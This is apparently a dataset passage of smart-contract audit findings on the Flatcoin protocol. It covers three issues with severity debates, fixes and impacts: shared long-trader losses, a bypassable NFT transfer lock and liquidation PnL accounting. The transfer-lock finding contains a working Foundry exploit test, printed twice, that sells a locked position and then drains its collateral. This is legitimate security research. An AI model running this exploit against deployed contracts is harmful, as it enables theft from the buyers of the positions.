your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nxiaoming9090\nEscalate\nLow (med at best)\nOracle's prices discrepancy should be within trader fee charged.\nThe escalation is invalid.\nThe report's sidenote and my comment shared by the lead judge have explained why the existing price deviation control does not prevent this attack.\nCzar102\nI agree with @xiaoming9090, I don't see a valid point in the escalation.\nPlanning to reject the escalation and leave the issue as is.\nnevillehuang\nAgree with @xiaoming9090 and @Czar102\nCzar102\nResult: High Has duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\n0xLogos: rejected"чLoss of assets as shown in the scenario above.\nCode Snippet\nTool used\nManual Review
Losses of some long traders can eat into the margins of othersчmediumч```\npriceShift = current price - last price\npriceShift = $600 - $1000 = -$400\n\nprofitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / current price\nprofitLossTotal = (12 ETH * -$400) / $600\nprofitLossTotal = -8 ETH\n```\nчThe losses of some long traders can eat into the margins of others, resulting in those affected long traders being unable to withdraw their margin and profits, leading to a loss of assets for the long traders.\nAt $T0$, the current price of ETH is $1000 and assume the following state:\nAlice's Long Position 1 Bob's Long Position 2 Charles (LP)\nPosition Size = 6 ETH\nMargin = 3 ETH\nLast Price (entry price) = $1000 Position Size = 6 ETH\nMargin = 5 ETH\nLast Price (entry price) = $1000 Deposited 12 ETH\nThe `stableCollateralTotal` will be 12 ETH\nThe `GlobalPositions.marginDepositedTotal` will be 8 ETH (3 + 5)\nThe `globalPosition.sizeOpenedTotal` will be 12 ETH (6 + 6)\nThe total balance of ETH in the vault is 20 ETH.\nAs this is a perfectly hedged market, the accrued fee will be zero, and ignored in this report for simplicity's sake.\nAt $T1$, the price of the ETH drops from $1000 to $600. At this point, the settle margin of both long positions will be as follows:\nAlice's Long Position 1 Bob's Long Position 2\npriceShift = Current Price - Last Price = $600 - $1000 = -$400\nPnL = (Position Size * priceShift) / Current Price = (6 ETH * -$400) / $400 = -4 ETH\nsettleMargin = marginDeposited + PnL = 3 ETH + (-4 ETH) = -1 ETH PnL = -4 ETH (Same calculation)\nsettleMargin = marginDeposited + PnL = 5 ETH + (-4 ETH) = 1 ETH\nAlice's long position is underwater (settleMargin < 0), so it can be liquidated. When the liquidation is triggered, it will internally call the `updateGlobalPositionData` function. Even if the liquidation does not occur, any of the following actions will also trigger the `updateGlobalPositionData` function internally:\nexecuteOpen\nexecuteAdjust\nexecuteClose\nThe purpose of the `updateGlobalPositionData` function is to update the global position data. This includes getting the total profit loss of all long traders (Alice & Bob), and updating the margin deposited total + stable collateral total accordingly.\nAssume that the `updateGlobalPositionData` function is triggered by one of the above-mentioned functions. Line 179 below will compute the total PnL of all the opened long positions.\n```\npriceShift = current price - last price\npriceShift = $600 - $1000 = -$400\n\nprofitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / current price\nprofitLossTotal = (12 ETH * -$400) / $600\nprofitLossTotal = -8 ETH\n```\n\nThe `profitLossTotal` is -8 ETH. This is aligned with what we have calculated earlier, where Alice's PnL is -4 ETH and Bob's PnL is -4 ETH (total = -8 ETH loss).\nAt Line 184 below, the `newMarginDepositedTotal` will be set to as follows (ignoring the `_marginDelta` for simplicity's sake)\n```\nnewMarginDepositedTotal = _globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal\nnewMarginDepositedTotal = 8 ETH + 0 + (-8 ETH) = 0 ETH\n```\n\nWhat happened above is that 8 ETH collateral is deducted from the long traders and transferred to LP. When `newMarginDepositedTotal` is zero, this means that the long trader no longer owns any collateral. This is incorrect, as Bob's position should still contribute 1 ETH remaining margin to the long trader's pool.\nLet's review Alice's Long Position 1: Her position's settled margin is -1 ETH. When the settled margin is -ve then the LPs have to bear the cost of loss per the comment here. However, in this case, we can see that it is Bob (long trader) instead of LPs who are bearing the cost of Alice's loss, which is incorrect.\nLet's review Bob's Long Position 2: His position's settled margin is 1 ETH. If his position's liquidation margin is $LM$, Bob should be able to withdraw $1\ ETH - LM$ of his position's margin. However, in this case, the `marginDepositedTotal` is already zero, so there is no more collateral left on the long trader pool for Bob to withdraw, which is incorrect.\nWith the current implementation, the losses of some long traders can eat into the margins of others, resulting in those affected long traders being unable to withdraw their margin and profits.ч"The following are the two issues identified earlier and the recommended fixes:\nIssue 1\nLet's review Alice's Long Position 1: Her position's settled margin is -1 ETH. When the settled margin is -ve then the LPs have to bear the cost of loss per the comment here. However, in this case, we can see that it is Bob (long trader) instead of LPs who are bearing the cost of Alice's loss, which is incorrect.\nFix: Alice -1 ETH loss should be borne by the LP, not the long traders. The stable collateral total of LP should be deducted by 1 ETH to bear the cost of the loss.\nIssue 2\nLet's review Bob's Long Position 2: His position's settled margin is 1 ETH. If his position's liquidation margin is $LM$, Bob should be able to withdraw $1\ ETH - LM$ of his position's margin. However, in this case, the `marginDepositedTotal` is already zero, so there is no more collateral left on the long trader pool for Bob to withdraw, which is incorrect.\nFix: Bob should be able to withdraw $1\ ETH - LM$ of his position's margin regardless of the PnL of other long traders. Bob's margin should be isolated from Alice's loss.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: high(7)\n0xLogos\nEscalate\nInvalid (maybe medium if I'm missing something, clearly not high)\nIsn't described scenario is just a speculation? Why Alice's long position was not liquidated earlier? Even if price dropped that significant in ~1 minute there is still enough time to liquidate.\nsherlock-admin2\nEscalate\nInvalid (maybe medium if I'm missing something, clearly not high)\nIsn't described scenario is just a speculation? Why Alice's long position was not liquidated earlier? Even if price dropped that significant in ~1 minute there is still enough time to liquidate.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nsecuritygrid\nThe judge should consider whether the scenario or the assumed system state (the value of some variables) described in a report will actually occur or not. This is important.\nThe scenario described in this report is unlikely to occur. Because Alice's position should have been liquidated before T1, why did it have to wait until bad debts occurred before it was liquidated? If the protocol has only one keeper, then such a scenario may occur when the keeper goes down. However, the protocol has multiple keepers: from third parties and from the protocol itself. It is impossible for all keepers going down.\nxiaoming9090\nThe issue stands valid and remains high as it leads to a loss of assets for the long traders, as described in the ""impact"" section of the report.\nThe scenario is a valid example to demonstrate the issue on hand. The points related to the timing of the liquidation in the escalation are irrelevant, as the bugs will be triggered when liquidation is executed.\nAlso, we cannot expect the liquidator keeper always to liquidate the accounts before the settled margin falls below zero (bad debt) under all circumstances due to many reasons (e.g., the price dropped too fast, delay due to too many TX queues at sequencer, time delay between the oracle and market price)\nThe scenario where the settled margin falls below zero (bad debt) is absolutely something that will happen in the real world. In the code of the liquidation function here, even the protocol expected that the settled margin could fall below zero (bad debt) under some conditions and implement logic to handle this scenario.\n```\n// If the settled margin is -ve then the LPs have to bear the cost.\n// Adjust the stable collateral total to account for user's profit/loss and the negative margin.\n// Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).\nvault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);\n```\n\n\nCzar102\nWould like sponsors to comment on this issue @D-Ig @itsermin @rashtrakoff – is it unintended? @nevillehuang any thoughts?\nGiven that this occurs on accrual of bad debt, I think it should be classified at most as a Medium severity issue.\nrashtrakoff\nThe old math (that is math being used in the audit version of contracts) had this side effect. The new math fixes this along with other issues.\nCzar102\nThank you @rashtrakoff.\nPlanning to accept the escalation and consider this a Medium severity issue.\nnevillehuang\nThank you @rashtrakoff.\nPlanning to accept the escalation and consider this a Medium severity issue.\nAgree to downgrade to medium severity\nCzar102\nResult: Medium Unique\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\n0xLogos: accepted"чLoss of assets for the long traders as the losses of some long traders can eat into the margins of others, resulting in those affected long traders being unable to withdraw their margin and profits.\nCode Snippet\nTool used\nManual Review
The transfer lock for leveraged position orders can be bypassedчhighч"```\nfunction testExploitTransferOut() public {\n    uint256 collateralPrice = 1000e8;\n\n    vm.startPrank(alice);\n\n    uint256 balance = WETH.balanceOf(alice);\n    console2.log(""alice balance"", balance);\n    \n    (uint256 minFillPrice, ) = oracleModProxy.getPrice();\n\n    // Announce order through delayed orders to lock tokenId\n    delayedOrderProxy.announceLeverageClose(\n        tokenId,\n        minFillPrice - 100, // add some slippage\n        mockKeeperFee.getKeeperFee()\n    );\n    \n    // Announce limit order to lock tokenId\n    limitOrderProxy.announceLimitOrder({\n        tokenId: tokenId,\n        priceLowerThreshold: 900e18,\n        priceUpperThreshold: 1100e18\n    });\n    \n    // Cancel limit order to unlock tokenId\n    limitOrderProxy.cancelLimitOrder(tokenId);\n    \n    balance = WETH.balanceOf(alice);\n    console2.log(""alice after creating two orders"", balance);\n\n    // TokenId is unlocked and can be transferred while the delayed order is active\n    leverageModProxy.transferFrom(alice, address(0x1), tokenId);\n    console2.log(""new owner of position NFT"", leverageModProxy.ownerOf(tokenId));\n\n    balance = WETH.balanceOf(alice);\n    console2.log(""alice after transfering position NFT out e.g. selling"", balance);\n\n    skip(uint256(vaultProxy.minExecutabilityAge())); // must reach minimum executability time\n\n    uint256 oraclePrice = collateralPrice;\n\n    bytes[] memory priceUpdateData = getPriceUpdateData(oraclePrice);\n    delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData);\n\n    uint256 finalBalance = WETH.balanceOf(alice);\n    console2.log(""alice after executing delayerd order and cashing out profit"", finalBalance);\n    console2.log(""profit"", finalBalance - balance);\n}\n```\n"ч"The leveraged positions can be closed either through `DelayedOrder` or through the `LimitOrder`. Once the order is announced via `DelayedOrder.announceLeverageClose` or `LimitOrder.announceLimitOrder` function the LeverageModule's `lock` function is called to prevent given token to be transferred. This mechanism can be bypassed and it is possible to unlock the token transfer while having order announced.\nExploitation scenario:\nAttacker announces leverage close order for his position via `announceLeverageClose` of `DelayedOrder` contract.\nAttacker announces limit order via `announceLimitOrder` of `LimitOrder` contract.\nAttacker cancels limit order via `cancelLimitOrder` of `LimitOrder` contract.\nThe position is getting unlocked while the leverage close announcement is active.\nAttacker sells the leveraged position to a third party.\nAttacker executes the leverage close via `executeOrder` of `DelayedOrder` contract and gets the underlying collateral stealing the funds from the third party that the leveraged position was sold to.\nFollowing proof of concept presents the attack:\n```\nfunction testExploitTransferOut() public {\n    uint256 collateralPrice = 1000e8;\n\n    vm.startPrank(alice);\n\n    uint256 balance = WETH.balanceOf(alice);\n    console2.log(""alice balance"", balance);\n    \n    (uint256 minFillPrice, ) = oracleModProxy.getPrice();\n\n    // Announce order through delayed orders to lock tokenId\n    delayedOrderProxy.announceLeverageClose(\n        tokenId,\n        minFillPrice - 100, // add some slippage\n        mockKeeperFee.getKeeperFee()\n    );\n    \n    // Announce limit order to lock tokenId\n    limitOrderProxy.announceLimitOrder({\n        tokenId: tokenId,\n        priceLowerThreshold: 900e18,\n        priceUpperThreshold: 1100e18\n    });\n    \n    // Cancel limit order to unlock tokenId\n    limitOrderProxy.cancelLimitOrder(tokenId);\n    \n    balance = WETH.balanceOf(alice);\n    console2.log(""alice after creating two orders"", balance);\n\n    // TokenId is unlocked and can be transferred while the delayed order is active\n    leverageModProxy.transferFrom(alice, address(0x1), tokenId);\n    console2.log(""new owner of position NFT"", leverageModProxy.ownerOf(tokenId));\n\n    balance = WETH.balanceOf(alice);\n    console2.log(""alice after transfering position NFT out e.g. selling"", balance);\n\n    skip(uint256(vaultProxy.minExecutabilityAge())); // must reach minimum executability time\n\n    uint256 oraclePrice = collateralPrice;\n\n    bytes[] memory priceUpdateData = getPriceUpdateData(oraclePrice);\n    delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData);\n\n    uint256 finalBalance = WETH.balanceOf(alice);\n    console2.log(""alice after executing delayerd order and cashing out profit"", finalBalance);\n    console2.log(""profit"", finalBalance - balance);\n}\n```\n\nOutput"ч"It is recommended to prevent announcing order either through `DelayedOrder.announceLeverageClose` or `LimitOrder.announceLimitOrder` if the leveraged position is already locked.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\ninvalid: i believe features that are meant for the future is out-of scope and thus selling feature falls into that; user can only transfer the nft now; nothing sort of selling; so no collateral fraud here.\n0xLogos\nEscalate\nInvalid, it's user mistake to buy such position\nsherlock-admin2\nEscalate\nInvalid, it's user mistake to buy such position\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nnovaman33\nEscalate\nInvalid, it's user mistake to buy such position\nThen if it is a user mistake the whole lock is unnecessary?\nr0ck3tzx\nThe token is supposed to be tradable which was also confirmed by the sponsor:\nThat means it cannot be treated as user mistake if you can sell the token and then steal underlying value.\n0xLogos\nIf trustless trade is desired parties must use some contract to facilitate atomic swap. For example NFT market place, but to exploit it attacker must somehow frontrun buying tx to announce order before, but it's impossible. Note that delayed orders expire in minutes. If atomic swap not used parties already trust each other.\nI believe it's really hard to realisticly exploit it and this should be low because attacker can't just ""sell"" position. It's not like art nft when underlying ""value"" is static. Here buyer choose to buy or not and it's his obligation to check announced orders just like checking position PnL.\nAlso transferable != tradable\nr0ck3tzx\nHalf of the protocol is the locking mechanism so its clear it is not supposed to be transferred. Its the same as you would transfer ERC721 without resetting approvals. I won't comment further on this, as you've escalated most of the issues, throwing mud and seeing what sticks. I don't have time for dealing with this.\nxiaoming9090\nEscalate.\nThis issue does not lead to loss of assets for the protocol or the protocol's users. It does not drain the assets within the protocol or steal the assets that Flatcoin's LPs/Long Traders deposit into the protocol. The only affected parties are external or third parties (not related to the protocol in any sense) who are being tricked into buying such position NFTs outside of the protocol border. Thus, it does not meet the requirement of a Med/High where the assets of the protocol and the protocol's users can be stolen.\nLow is a more appropriate category for such an issue.\nsherlock-admin2\nEscalate.\nThis issue does not lead to loss of assets for the protocol or the protocol's users. It does not drain the assets within the protocol or steal the assets that Flatcoin's LPs/Long Traders deposit into the protocol. The only affected parties are external or third parties (not related to the protocol in any sense) who are being tricked into buying such position NFTs outside of the protocol border. Thus, it does not meet the requirement of a Med/High where the assets of the protocol and the protocol's users can be stolen.\nLow is a more appropriate category for such an issue.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nABDuullahi\nI believe this issue should be invalid.\nThe report has been tailored on the fact that the NFTs can be traded and the impact also is that when a user buys the position, there isn't anything sort of selling, thats for users to deal with, the sponsor confirm that there might be a feature that will allow that position(NFT) to be used as a collateral but that isn't of our concern in this case. Other issues demonstrating the NFT being transferred should stay valid due to the fact that they aren't meant to, and thus breaking a core invariant of the protocol.\nr0ck3tzx\nThe user who purchases the position becomes a user of the protocol. The affected party is then a user of the protocol holding a malicious position from which the attacker can steal funds. To render this issue invalid, it would be required to show that the position (ERC721) holds no value which is false.\n@ABDuullahi let me understand correctly, you are claiming that this specific report that presents the whole attack scenario with PoC should be invalidated, but the others that are saying it breaks the invariant should be valid?\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/278.\nnevillehuang\nI believe this issue should remain as valid, given\nIt is explicitly mentioned that the token is locked when an order is announced, so it is implied that it should remain locked.\nTokens are supposed to be traded and is public knowledge mentioned by sponsor as noted by this comment\nCzar102\nSo, a locked position can have an action queued that will grant a fraction (potentially all) tokens within the position to the past owner? And this action will be executed after the sale happens? @nevillehuang @r0ck3tzx @0xLogos\nIf that's the case, the buyer should have checked that the position has no pending withdrawals.\nr0ck3tzx\n@Czar102 The position can be transferred/traded freely. When user decides to close the position he can either do that via `announceLeverageClose` or `announceLimitOrder`. Once the order is announced the position is locked and it should not be transferred/traded in any way. This logic of locking position takes significant portion of the codebase.\nThe issue is pretty much connected to two things:\nBreaking one of the core invariants of the protocol.\nAbility to pull up the attack of selling position for which order is announced and can be executed which allows to steal not portion but ALL underlying tokens of the position.\nI cannot agree that the buyer should have checked for that - this case is very similar to ERC721 where upon transfers the approval is cleared. You could argue that every buyer of NFT should check first if the approval was cleared out but obviously that would make NFTs unusable and nobody would trade them.\nnevillehuang\nAgree with @r0ck3tzx comments, also to note normally, this type of finding would likely be invalid as it would entail out of scope secondary market exchanges between the buyer and seller of the NFT. However, as noted by my comment here, it is implied that the lock should persist, so a honeypot attack shouldn't be possible.\nCzar102\nWhat's the main goal of having the lock functionality?\n0xjuaan\nit prevents people from transferring the nft while an order is pending for that nft's tokenId\nCzar102\nUnderstood, but is it expressed anywhere what is it for?\nnovaman33\n@Czar102 https://discord.com/channels/812037309376495636/1199005620536356874/1202201279817072691\nxiaoming9090\n@Czar102 https://discord.com/channels/812037309376495636/1199005620536356874/1202201279817072691\nThe sponsor mentioned, ""If our NFT was integrated in other protocols"", would that be considered a future issue under Sherlock rule since it is still unsure at this point if their NFT will be integrated with other protocols?\n0xcrunch\nI believe sponsor was actually demonstrating that the lock functionality is very important and any related issue is unacceptable.\nr0ck3tzx\n@Czar102\nWhat's the main goal of having the lock functionality?\nWhen you have an position and you want to close it, the locking functionality ensures that you are not transferring/trading it. You shouldnt be able to sell something you dont own.\nUnderstood, but is it expressed anywhere what is it for?\nAre we going now towards a direction of expecting sponsors to write a book about every line of the protocol so the LSW cannot start his ""legal"" battle? We are literally now wasting time on proving that the man is not a camel.\n@xiaoming9090\n@Czar102 https://discord.com/channels/812037309376495636/1199005620536356874/1202201279817072691\nThe sponsor mentioned, ""If our NFT was integrated in other protocols"", would that be considered a future issue under Sherlock rule since it is still unsure at this point if their NFT will be integrated with other protocols?\nIts absolutely disgusting how LSW again is twisting the words and confusing the judges. That way every issue related to protocol own tokens should be invalid, because their value depends on the future integration with DEX such as Uniswap.\nCzar102\nI think the intention of the smart contracts working with exchanges (that's the goal of the lock functionality) is extremely clear, so the inability to arbitrarily unlock is an extremely property that breaks planned (not future!) integrations.\nHence, I think this issue should maintain its validity and severity.\nEvert0x\nResult: High Has Duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\n0xLogos: rejected\nxiaoming9090: rejected"чThe attacker can sell the leveraged position with a close order opened, execute the order afterward, and steal the underlying collateral.\nCode Snippet\nTool used\nManual Review
Incorrect handling of PnL during liquidationчhighч```\nsettleFundingFees() = Short/LP need to pay Long 100\n\nmarginDepositedTotal = marginDepositedTotal + funding fee\nmarginDepositedTotal = y + (-100) = (y - 100)\n\nstableCollateralTotal = x + (-(-100)) = (x + 100)\n```\nчThe incorrect handling of PnL during liquidation led to an error in the protocol's accounting mechanism, which might result in various issues, such as the loss of assets and the stable collateral total being inflated.\nFirst Example\nAssume a long position with the following state:\nMargin Deposited = +20\nAccrued Funding = -100\nProfit & Loss (PnL) = +100\nLiquidation Margin = 30\nLiquidation Fee = 25\nSettled Margin = Margin Deposited + Accrued Funding + PnL = 20\nLet the current `StableCollateralTotal` be $x$ and `marginDepositedTotal` be $y$ at the start of the liquidation.\nFirstly, the `settleFundingFees()` function will be executed at the start of the liquidation process. The effect of the `settleFundingFees()` function is shown below. The long trader's `marginDepositedTotal` will be reduced by 100, while the LP's `stableCollateralTotal` will increase by 100.\n```\nsettleFundingFees() = Short/LP need to pay Long 100\n\nmarginDepositedTotal = marginDepositedTotal + funding fee\nmarginDepositedTotal = y + (-100) = (y - 100)\n\nstableCollateralTotal = x + (-(-100)) = (x + 100)\n```\n\nSince the position's settle margin is below the liquidation margin, the position will be liquidated.\nAt Line 109, the condition `(settledMargin > 0)` will be evaluated as `True`. At Line 123:\n```\nif (uint256(settledMargin) > expectedLiquidationFee)\nif (+20 > +25) => False\nliquidatorFee = settledMargin\nliquidatorFee = +20\n```\n\nThe `liquidationFee` will be to +20 at Line 127 below. This basically means that all the remaining margin of 20 will be given to the liquidator, and there should be no remaining margin for the LPs.\nAt Line 133 below, the `vault.updateStableCollateralTotal` function will be executed:\n```\nvault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss);\nvault.updateStableCollateralTotal(0 - (+100));\nvault.updateStableCollateralTotal(-100);\n\nstableCollateralTotal = (x + 100) - 100 = x\n```\n\nWhen `vault.updateStableCollateralTotal` is set to `-100`, `stableCollateralTotal` is equal to $x$.\nNext, the `vault.updateGlobalPositionData` function here will be executed.\n```\nvault.updateGlobalPositionData({marginDelta: -(position.marginDeposited + positionSummary.accruedFunding)})\nvault.updateGlobalPositionData({marginDelta: -(20 + (-100))})\nvault.updateGlobalPositionData({marginDelta: 80})\n\nprofitLossTotal = 100\nnewMarginDepositedTotal = globalPositions.marginDepositedTotal + marginDelta + profitLossTotal\nnewMarginDepositedTotal = (y - 100) + 80 + 100 = (y + 80)\n\nstableCollateralTotal = stableCollateralTotal + -PnL\nstableCollateralTotal = x + (-100) = (x - 100)\n```\n\nThe final `newMarginDepositedTotal` is $y + 80$ and `stableCollateralTotal` is $x -100$, which is incorrect. In this scenario\nThere is no remaining margin for the LPs, as all the remaining margin has been sent to the liquidator as a fee. The remaining margin (settled margin) is also not negative. Thus, there should not be any loss on the `stableCollateralTotal`. The correct final `stableCollateralTotal` should be $x$.\nThe final `newMarginDepositedTotal` is $y + 80$, which is incorrect as this indicates that the long trader's pool has gained 80 ETH, which should not be the case when a long position is being liquidated.\nSecond Example\nThe current price of rETH is $1000.\nLet's say there is a user A (Alice) who makes a deposit of 5 rETH as collateral for LP.\nLet's say another user, Bob (B), comes up, deposits 2 rETH as a margin, and creates a position with a size of 5 rETH, basically creating a perfectly hedged market. Since this is a perfectly hedged market, the accrued funding fee will be zero for the context of this example.\nTotal collateral in the system = 5 rETH + 2 rETH = 7 rETH\nAfter some time, the price of rETH drop to $500. As a result, Bob's position is liquidated as its settled margin is less than zero.\n$$ settleMargin = 2\ rETH + \frac{5 \times (500 - 1000)}{500} = 2\ rETH - 5\ rETH = -3\ rETH $$\nDuring the liquidation, the following code is executed to update the LP's stable collateral total:\n```\nvault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);\nvault.updateStableCollateralTotal(-3 rETH - (-5 rETH));\nvault.updateStableCollateralTotal(+2);\n```\n\nLP's stable collateral total increased by 2 rETH.\nSubsequently, the `updateGlobalPositionData` function will be executed.\nWithin the `updateGlobalPositionData` function, the `profitLossTotal` at Line 179 will be -5 rETH. This means that the long trader (Bob) has lost 5 rETH.\nAt Line 205 below, the PnL of the long traders (-5 rETH) will be transferred to the LP's stable collateral total. In this case, the LPs gain 5 rETH.\nNote that the LP's stable collateral total has been increased by 2 rETH earlier and now we are increasing it by 5 rETH again. Thus, the total gain by LPs is 7 rETH. If we add 7 rETH to the original stable collateral total, it will be 7 rETH + 5 rETH = 12 rETH. However, this is incorrect because we only have 7 rETH collateral within the system, as shown at the start.\nThird Example\nAt $T0$, the marginDepositedTotal = 70 ETH, stableCollateralTotal = 100 ETH, vault's balance = 170 ETH\nBob's Long Position Alice (LP)\nMargin = 70 ETH\nPosition Size = 500 ETH\nLeverage = (500 + 20) / 20 = 26x\nLiquidation Fee = 50 ETH\nLiquidation Margin = 60 ETH\nEntry Price = $1000 per ETH Deposited = 100 ETH\nAt $T1$, the position's settled margin falls to 60 ETH (margin = +70, accrued fee = -5, PnL = -5) and is subjected to liquidation.\nFirstly, the `settleFundingFees()` function will be executed at the start of the liquidation process. The effect of the `settleFundingFees()` function is shown below. The long trader's `marginDepositedTotal` will be reduced by 5, while the LP's `stableCollateralTotal` will increase by 5.\n```\nsettleFundingFees() = Long need to pay short 5\n\nmarginDepositedTotal = marginDepositedTotal + funding fee\nmarginDepositedTotal = 70 + (-5) = 65\n\nstableCollateralTotal = 100 + (-(-5)) = 105\n```\n\nNext, this part of the code will be executed to send a portion of the liquidated position's margin to the liquidator and LPs.\n```\nsettledMargin > 0 => True\n(settledMargin > expectedLiquidationFee) => (+60 > +50) => True\nremainingMargin = uint256(settledMargin) - expectedLiquidationFee = 60 - 50 = 10\n```\n\n50 ETH will be sent to the liquidator and the remaining 10 ETH should goes to the LPs.\n```\nvault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss) =>\nstableCollateralTotal = 105 ETH + (remaining margin - PnL)\nstableCollateralTotal = 105 ETH + (10 ETH - (-5 ETH))\nstableCollateralTotal = 105 ETH + (15 ETH) = 120 ETH\n```\n\nNext, the `vault.updateGlobalPositionData` function here will be executed.\n```\nvault.updateGlobalPositionData({marginDelta: -(position.marginDeposited + positionSummary.accruedFunding)})\nvault.updateGlobalPositionData({marginDelta: -(70 + (-5))})\nvault.updateGlobalPositionData({marginDelta: -65})\n\nprofitLossTotal = -5\nnewMarginDepositedTotal = globalPositions.marginDepositedTotal + marginDelta + profitLossTotal\nnewMarginDepositedTotal = 70 + (-65) + (-5) = 0\n\nstableCollateralTotal = stableCollateralTotal + -PnL\nstableCollateralTotal = 120 + (-(5)) = 125\n```\n\nThe reason why the profitLossTotal = -5 is because there is only one (1) position in the system. So, this loss actually comes from the loss of Bob's position.\nThe `newMarginDepositedTotal = 0` is correct. This is because the system only has 1 position, which is Bob's position; once the position is liquidated, there should be no margin deposited left in the system.\nHowever, `stableCollateralTotal = 125` is incorrect. Because the vault's collateral balance now is 170 - 50 (send to liquidator) = 120. Thus, the tracked balance and actual collateral balance are not in sync.чTo remediate the issue, the `profitLossTotal` should be excluded within the `updateGlobalPositionData` function during liquidation.\n```\n// Remove the line below\n profitLossTotal = PerpMath._profitLossTotal(// rest of code)\n\n// Remove the line below\n newMarginDepositedTotal = globalPositions.marginDepositedTotal // Add the line below\n _marginDelta // Add the line below\n profitLossTotal\n// Add the line below\n newMarginDepositedTotal = globalPositions.marginDepositedTotal // Add the line below\n _marginDelta\n\nif (newMarginDepositedTotal < 0) {\n    revert FlatcoinErrors.InsufficientGlobalMargin();\n}\n\n_globalPositions = FlatcoinStructs.GlobalPositions({\n    marginDepositedTotal: uint256(newMarginDepositedTotal),\n    sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) // Add the line below\n _additionalSizeDelta).toUint256(),\n    lastPrice: _price\n});\n        \n// Remove the line below\n _updateStableCollateralTotal(// Remove the line below\nprofitLossTotal);\n```\n\nThe existing `updateGlobalPositionData` function still needs to be used for other functions besides liquidation. As such, consider creating a separate new function (e.g., updateGlobalPositionDataDuringLiquidation) solely for use during the liquidation that includes the above fixes.\nThe following attempts to apply the above fix to the three (3) examples described in the report to verify that it is working as intended.\nFirst Example\nLet the current `StableCollateralTotal` be $x$ and `marginDepositedTotal` be $y$ at the start of the liquidation.\nDuring funding settlement:\nStableCollateralTotal = $x$ + 100\nmarginDepositedTotal = $y$ - 100\nDuring updateStableCollateralTotal:\n```\nvault.updateStableCollateralTotal(int256(remainingMargin) - positionSummary.profitLoss);\nvault.updateStableCollateralTotal(0 - (+100));\nvault.updateStableCollateralTotal(-100);\n```\n\nStableCollateralTotal = ($x$ + 100) - 100 = $x$\nDuring Global Position Update:\nmarginDelta = -(position.marginDeposited + positionSummary.accruedFunding) = -(20 + (-100)) = 80\nnewMarginDepositedTotal = marginDepositedTotal + marginDelta = ($y$ - 100) + 80 = ($y$ - 20)\nNo change to StableCollateralTotal here. Remain at $x$\nConclusion:\nThe LPs should not gain or lose in this scenario. Thus, the fact that the StableCollateralTotal remains as $x$ before and after the liquidation is correct.\nThe `marginDepositedTotal` is ($y$ - 20) is correct because the liquidated position's remaining margin is 20 ETH. Thus, when this position is liquidated, 20 ETH should be deducted from the `marginDepositedTotal`\nNo revert during the execution.\nSecond Example\nDuring updateStableCollateralTotal:\n```\nvault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);\nvault.updateStableCollateralTotal(-3 rETH - (-5 rETH));\nvault.updateStableCollateralTotal(+2);\n```\n\nStableCollateralTotal = 5 + 2 = 7 ETH\nDuring Global Position Update:\nmarginDelta = -(position.marginDeposited + positionSummary.accruedFunding) = -(2 + 0) = -2\nmarginDepositedTotal = marginDepositedTotal + marginDelta = 2 + (-2) = 0\nConclusion:\nStableCollateralTotal = 7 ETH, marginDepositedTotal = 0 (Total 7 ETH tracked in the system)\nBalance of collateral in the system = 7 ETH. Thus, both values are in sync. No revert.\nThird Example\nDuring funding settlement (Transfer 5 from Long to LP):\nmarginDepositedTotal = 70 + (-5) = 65\nStableCollateralTotal = 100 + 5 = 105\nTransfer fee to Liquidator\n50 ETH sent to the liquidator from the system: Balance of collateral in the system = 170 ETH - 50 ETH = 120 ETH\nDuring updateStableCollateralTotal:\n```\nvault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss) =>\nstableCollateralTotal = 105 ETH + (remaining margin - PnL)\nstableCollateralTotal = 105 ETH + (10 ETH - (-5 ETH))\nstableCollateralTotal = 105 ETH + (15 ETH) = 120 ETH\n```\n\nStableCollateralTotal = 120 ETH\nDuring Global Position Update:\nmarginDelta= -(position.marginDeposited + positionSummary.accruedFunding) = -(70 + (-5)) = -65\nmarginDepositedTotal = 65 + (-65) = 0\nConclusion:\nStableCollateralTotal = 120 ETH, marginDepositedTotal = 0 (Total 120 ETH tracked in the system)\nBalance of collateral in the system = 120 ETH. Thus, both values are in sync. No revert.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: whole lot of lessons taught here; high(3)\nrashtrakoff\nWow, this is a detailed explanation. We did find this issue during the audit and glad that you have found it as well!\nitsermin\nI believe this type of scenario is also fixed in the PR for #186: https://github.com/dhedge/flatcoin-v1/pull/266/commits/3a95a5b932fb9dcd770afd589751ecfd151360a8\nIt appears that this issue #186 and #192 are covering the same ground.\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266.чThe following is a list of potential impacts of this issue:\nFirst Example: LPs incur unnecessary losses during liquidation, which would be avoidable if the calculations were correctly implemented from the start.\nSecond Example: An error in the protocol's accounting mechanism led to an inflated increase in the LPs' stable collateral total, which in turn inflated the number of tokens users can withdraw from the 